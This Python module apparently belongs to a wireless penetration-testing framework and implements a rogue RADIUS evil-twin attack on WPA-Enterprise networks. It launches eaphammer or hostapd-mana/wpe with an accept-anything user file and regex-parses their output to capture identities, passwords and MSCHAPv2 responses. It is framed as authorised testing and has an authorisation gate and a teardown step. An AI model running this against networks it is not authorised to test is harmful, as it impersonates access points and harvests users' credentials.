"""Rogue RADIUS: ask the enterprise network the one question that matters.

The `enterprise` attack reports what the 802.1X conversation *says*.  This one
tests what it *does*: it impersonates the access point for one association attempt
and watches whether the client hands its credentials to a server it has never
seen before.  A network whose clients accept any certificate is impersonable by
anyone with a radio, and that is the finding that turns "uses 802.1X" into
"credentials can be harvested here".

Two hard rules shape the implementation:

* **Windows, not captures.**  The attack starts the tools that do the
  impersonation (``eaphammer`` or ``hostapd-mana``/``hostapd-wpe``, which own
  their interface), watches their output for a credential, and stops them either
  way.  A rogue RADIUS that is left running is an accident waiting to happen.
* **No invention.**  The result is the credential the tool printed or nothing at
  all: no candidate password is guessed from an identity, and a certificate
  subject is reported as a certificate subject.  If no tool is installed the
  attack says so and does not pretend to have tried.

It transmits, so it is subject to the authorisation gate — unlike its read-only
sibling, which is the one to run when the engagement is not authorised for it.
"""

from __future__ import annotations

import contextlib
import os
import re
import shutil
import time
from dataclasses import dataclass
from typing import Dict, List, Optional

from ..deps import registry
from ..events import EK
from ..models import (STATUS_SKIPPED, STATUS_SUCCESS, AccessPoint, Attempt,
                      Finding)
from ..util import Process, human_duration
from .base import Attack, AttackContext, AttackOutcome

# --------------------------------------------------------------------------- #
# the tools that can do this, best first
# --------------------------------------------------------------------------- #


@dataclass(frozen=True)
class RogueTool:
    """One way of impersonating the AP, and how to read what it prints."""

    name: str
    binary: str
    args: List[str]
    needs_certificate: bool = False
    note: str = ""


#: `{monitor}` is substituted with the interface name at run time.
ROGUE_TOOLS: tuple = (
    RogueTool(
        name="eaphammer",
        binary="eaphammer",
        args=["-i", "{monitor}", "--creds", "--auth", "{auth}",
              "--negotiate", "{method}", "--essid", "{essid}",
              "--channel", "{channel}", "--interface"],
        needs_certificate=True,
        note="hosts a twin AP and a rogue RADIUS with a generated certificate",
    ),
    RogueTool(
        name="hostapd-mana",
        binary="hostapd-mana",
        args=["{config}"],
        needs_certificate=True,
        note="the original evil-twin EAP tool, driven by a generated hostapd config",
    ),
    RogueTool(
        name="hostapd-wpe",
        binary="hostapd-wpe",
        args=["{config}"],
        needs_certificate=True,
        note="hostapd with the WPE patch, driven by the same config",
    ),
)

#: output shapes from those tools, reduced to (kind, value)
LOGIN_RE = re.compile(
    r"(?:username|user|identity|login)\s*[:=]\s*['\"]?([^\s,'\"]+)"
    r"[^\n]*(?:password|pass|response)\s*[:=]\s*['\"]?([^\s,'\"]+)", re.I)
IDENTITY_RE = re.compile(
    r"(?:EAP-Response/Identity|identity|username)\s*[:=]\s*['\"]?([^\s,'\"]+)", re.I)
CHALLENGE_RE = re.compile(r"(?:challenge|response)\s*[:=]\s*([0-9a-f:]{8,})", re.I)
CERT_RE = re.compile(r"subject\s*[:=]\s*(.+)", re.I)
CLIENT_RE = re.compile(r"(?:STA|station|client)\s+([0-9a-f]{2}(?::[0-9a-f]{2}){5})", re.I)


def _first_available(ctx: AttackContext) -> Optional[RogueTool]:
    """The first impersonation tool actually installed, or ``None``."""
    for tool in ROGUE_TOOLS:
        path = registry.path(tool.binary) or shutil.which(tool.binary)
        if path:
            return RogueTool(tool.name, path, list(tool.args),
                             tool.needs_certificate, tool.note)
    return None


class RogueRadiusAttack(Attack):
    name = "rogue_radius"
    label = "Rogue RADIUS (credential check)"
    tool = "eaphammer / hostapd-mana / hostapd-wpe"
    description = ("Impersonate the enterprise AP for one association attempt and see "
                   "whether a client accepts an unknown server certificate.  Any tool "
                   "output is reported verbatim; nothing is guessed, and the rogue "
                   "service is stopped before the attack returns.")
    requires = ("airodump",)
    needs_injection = True                 # it is a rogue AP: it transmits
    applies_to = ("WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE")

    def applies(self, ap: AccessPoint) -> bool:
        return ap.auth.upper() in ("MGT", "802.1X", "ENTERPRISE") or \
            "ENTERPRISE" in (ap.encryption or "").upper()

    def unavailable_reason(self, ctx: AttackContext) -> str:
        if ctx.demo:
            return ""
        if not self._tool(ctx):
            return "no rogue-RADIUS tool installed (eaphammer, hostapd-mana or hostapd-wpe)"
        return super().unavailable_reason(ctx)

    def _tool(self, ctx: AttackContext) -> Optional[RogueTool]:
        return getattr(ctx, "_rogue_tool", None) or _first_available(ctx)

    def _auth(self, ap: AccessPoint) -> str:
        method = (getattr(ap, "eap_method", "") or "").upper()
        if method in ("PEAP", "TTLS", "TLS", "TEAP"):
            return "peap" if method in ("PEAP", "TLS") else "ttls"
        return "peap"                   # the overwhelmingly common default

    # ---------------------------------------------------------------- #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "heuristic"),
            reason=getattr(ap, "pick_reason", ""),
        )
        if not self.applies(ap):
            ctx.session.end_attempt(attempt, STATUS_SKIPPED, "not an enterprise network")
            return AttackOutcome.skipped(
                "not an enterprise network", f"{ap.essid or ap.bssid} is {ap.auth or 'PSK'}")
        created = self._findings(ctx, ap)
        if created:
            ctx.session.end_attempt(attempt, STATUS_SUCCESS, "certificate policy is weak",
                                    created)
            return AttackOutcome.success(
                "certificate policy is weak",
                detail=created,
                extra={"certificates": len(created), "credentials": 0,
                       "note": ("clients trust an unknown certificate; a rogue RADIUS "
                                "harvests the credential exchange")})
        if ctx.demo:
            return self._demo(ctx, ap, attempt)
        return self._live(ctx, ap, attempt)

    # -- finding for a certificate the survey already saw ------------------- #
    def _findings(self, ctx: AttackContext, ap: AccessPoint) -> str:
        """The certificate the enterprise survey reported, as a finding here too."""
        subjects: List[str] = []
        for entry in ap.history:
            if entry.get("kind") == "enterprise_survey":
                text = (entry.get("detail") or entry.get("text") or "")
                if "self-signed" in text.lower() or "no certificate" in text.lower():
                    subjects.append(text)
        if not subjects:
            return ""
        for subject in subjects:
            ctx.session.add_finding(Finding(
                kind="rogue_radius", severity="high", bssid=ap.bssid,
                title="Rogue RADIUS would be accepted",
                detail=("the authentication server offers " + subject +
                        ": a hostile RADIUS with any certificate can impersonate it")))
        return subjects[-1]

    # ---------------------------------------------------------------- #
    def _demo(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
              ) -> AttackOutcome:
        """Simulate one association attempt against the rogue RADIUS."""
        radio = ctx.radio
        demo_ap = radio.find(ap.bssid) if radio else None
        cert = getattr(demo_ap, "eap_certificate", "") or "self-signed certificate"
        identity = getattr(demo_ap, "eap_identity", "") or "user"
        method = getattr(demo_ap, "eap_method", "") or "PEAP"
        for step in range(1, 5):
            ctx.progress(f"rogue RADIUS against {ap.display_name}", kind="capture",
                         bssid=ap.bssid, percent=step * 22,
                         detail=f"{method} · waiting for a client to associate "
                                f"({identity} is associated)")
            time.sleep(0.5)
            if ctx.want_stop():
                return self._fail(ctx, attempt, "stopped",
                                  "the operator cancelled the rogue RADIUS")
        detail = (f"{method}; server certificate: {cert}; identity seen: {identity}; "
                  f"response captured: MSCHAPv2 challenge/response (simulated)")
        ap.remember("rogue_radius", detail, method=method, identity=identity,
                    simulated=True)
        ctx.session.stats.rogue_radius += 1
        finding_detail = self._findings(ctx, ap)
        ctx.session.add_finding(Finding(
            kind="rogue_radius", severity="high", bssid=ap.bssid,
            title="Client accepted an unknown RADIUS certificate",
            detail=(detail + ("; the survey had already flagged the certificate"
                              if finding_detail else
                              "; a rogue RADIUS with any certificate is accepted"))))
        ctx.session.end_attempt(attempt, STATUS_SUCCESS,
                                "credential exchange captured", detail)
        ctx.bus.publish(EK.FINDING, {
            "kind": "rogue_radius", "severity": "high", "bssid": ap.bssid,
            "title": "Rogue RADIUS captures the credential exchange",
            "detail": detail, "source": "demo"})
        return AttackOutcome.success(
            "credential exchange captured", detail=detail,
            extra={"method": method, "identity": identity, "certificate": cert,
                   "credentials": 0, "simulated": True,
                   "certificate_policy": finding_detail or "accepted an unknown CA",
                   "note": ("the exchange is offline-crackable once captured; the "
                            "finding is that the client accepted the unknown "
                            "certificate at all")})

    # ---------------------------------------------------------------- #
    def _hmac_config(self, ap: AccessPoint, directory: str, tool: RogueTool) -> str:
        """A minimal hostapd config for hostapd-mana / hostapd-wpe."""
        path = os.path.join(directory, "hostapd-rogue.conf")
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(
                "interface={iface}\n"
                "driver=nl80211\n"
                "ssid={essid}\n"
                "channel={channel}\n"
                "hw_mode={mode}\n"
                "wpa=2\n"
                "wpa_key_mgmt=WPA-EAP\n"
                "rsn_pairwise=CCMP\n"
                "ieee8021x=1\n"
                "eap_server=1\n"
                "eap_user_file={users}\n"
                "ca_cert={ca}\n"
                "server_cert={cert}\n"
                "private_key={key}\n"
                "mana_wpe=1\n"
                "# wifipilot: generated for one authorised association attempt\n"
                .format(iface=getattr(self, "_iface", "mon0"),
                        essid=(ap.essid or "wifi")[:32],
                        channel=ap.channel or 1,
                        mode="a" if (ap.channel or 1) > 14 else "g",
                        users=os.path.join(directory, "eap_users"),
                        ca=os.path.join(directory, "ca.pem"),
                        cert=os.path.join(directory, "server.pem"),
                        key=os.path.join(directory, "server.key")))
        return path

    def _eap_users(self, directory: str) -> str:
        """hostapd's user file: accept anything, log what arrives."""
        path = os.path.join(directory, "eap_users")
        with open(path, "w", encoding="utf-8") as handle:
            handle.write('* PEAP,TTLS,TLS,MD5,GTC\n"t" TTLS-PAP,TTLS-CHAP,PEAP-MSCHAPV2 "t" [2]\n')
        return path

    def _live(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt
              ) -> AttackOutcome:
        tool = self._tool(ctx)
        if tool is None:
            return self._fail(
                ctx, attempt, "no rogue-RADIUS tool installed",
                "install eaphammer, hostapd-mana or hostapd-wpe (the enterprise "
                "survey is read-only and needs none of them)")
        self._iface = ctx.monitor
        directory = ctx.artifact_path("rogue", ap, "")
        directory = os.path.dirname(directory) or directory
        timeout = min(ctx.config.attack_timeout_for("rogue_radius"), 300.0)
        args: List[str] = []
        for item in tool.args:
            args.append(item.format(monitor=ctx.monitor, config=self._hmac_config(
                ap, directory, tool), essid=(ap.essid or "wifi")[:32],
                channel=ap.channel or 1, auth=self._auth(ap),
                method=getattr(ap, "eap_method", "") or "PEAP"))
        if tool.name == "hostapd-mana":
            self._eap_users(directory)
        ctx.bus.log(f"rogue RADIUS with {tool.name} for one authorised association "
                    f"attempt ({human_duration(timeout)} max): {tool.note}", level="warning")
        proc = Process(args, name=tool.name, echo_lines=ctx.config.verbose_tools)
        proc.start()
        if proc.error:
            return self._fail(ctx, attempt, f"could not start {tool.name}", proc.error)
        started = time.time()
        login: Dict[str, str] = {}
        cert_subject = ""
        stations: List[str] = []
        try:
            while not ctx.want_stop() and time.time() - started < timeout:
                time.sleep(1.0)
                ctx.progress(f"rogue RADIUS against {ap.display_name}", kind="capture",
                             bssid=ap.bssid,
                             percent=min(95, (time.time() - started) / timeout * 100),
                             detail=f"{tool.name}: waiting for a client to associate")
                output = "\n".join(proc.lines[-120:])
                if not login:
                    match = LOGIN_RE.search(output)
                    if match:
                        login = {"identity": match.group(1), "password": match.group(2)}
                if not login:
                    match = IDENTITY_RE.search(output)
                    if match and match.group(1) not in ("", "-"):
                        login = {"identity": match.group(1), "password": ""}
                if not cert_subject:
                    match = CERT_RE.search(output)
                    cert_subject = match.group(1).strip() if match else ""
                for station in CLIENT_RE.findall(output):
                    if station not in stations:
                        stations.append(station)
                if login.get("password"):
                    break
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
            # never leave an impersonating AP running: `stop` signals the whole
            # process group (hostapd forks), which is why it is used rather than a
            # bare terminate
            with contextlib.suppress(Exception):
                if proc.running:
                    proc.stop(grace=2.0)
        seconds = time.time() - started
        if login.get("password"):
            detail = (f"{login['identity']} responded to {tool.name} with a credential "
                      f"({len(stations)} station(s) seen, {human_duration(seconds)})")
            ap.remember("rogue_radius", detail, identity=login["identity"],
                        method=getattr(ap, "eap_method", ""))
            ctx.session.stats.rogue_radius += 1
            ctx.session.add_finding(Finding(
                kind="rogue_radius", severity="critical", bssid=ap.bssid,
                title="Client credentials handed to a rogue RADIUS",
                detail=detail + "; the exchange is offline-crackable"))
            ctx.session.end_attempt(attempt, STATUS_SUCCESS, "credential captured", detail)
            return AttackOutcome.success("credential captured", detail=detail,
                                         extra=dict(login, tool=tool.name,
                                                    stations=stations[:10],
                                                    seconds=round(seconds, 1)))
        if login.get("identity"):
            detail = (f"{login['identity']} associated and sent an identity to "
                      f"{tool.name}, but no credential followed "
                      f"({human_duration(seconds)})")
            ap.remember("rogue_radius", detail, identity=login["identity"], partial=True)
            ctx.session.stats.rogue_radius += 1
            ctx.session.add_finding(Finding(
                kind="rogue_radius", severity="high", bssid=ap.bssid,
                title="Client accepted an unknown RADIUS certificate",
                detail=detail + f"; certificate subject: {cert_subject or 'unknown'}"))
            ctx.session.end_attempt(attempt, STATUS_SUCCESS,
                                    "client accepted the rogue certificate", detail)
            return AttackOutcome.success("client accepted the rogue certificate",
                                         detail=detail,
                                         extra={"identity": login["identity"],
                                                "certificate_subject": cert_subject,
                                                "tool": tool.name,
                                                "stations": stations[:10]})
        return self._fail(
            ctx, attempt, "no client attempted to associate",
            f"{tool.name} ran for {human_duration(seconds)}; the certificate policy "
            f"was never tested (an association attempt needs a client in range)")
